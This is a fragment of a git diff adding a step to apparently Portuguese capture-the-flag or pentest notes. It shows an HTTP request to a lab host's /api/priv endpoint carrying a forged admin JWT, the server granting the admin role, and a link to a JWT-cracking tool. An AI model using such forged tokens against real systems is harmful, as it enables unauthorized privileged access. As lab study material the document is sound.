@@ -128,9 +128,35 @@ index 1347e8c..cf6bf21 100644
      }
 ````
 
+5. Verifique o token
+````http
+GET /api/priv HTTP/1.1
+Host: 10.10.11.120
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 0
+auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5MDAwNTY2YTdlNTA0NjhhNGFlNGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNjExMjc4fQ.-GiEdOB97BN4toK2PGGvjE-5UocBCV_dzj5vSRGRDLk
 
 
+````
 
+````http
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 76
+ETag: W/"4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0"
+Date: Sat, 08 Jan 2022 03:17:46 GMT
+Connection: close
+
+{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
+````
+
+Tool to crack JWT:
 https://lmammino.github.io/jwt-cracker/
 
 ## Windows
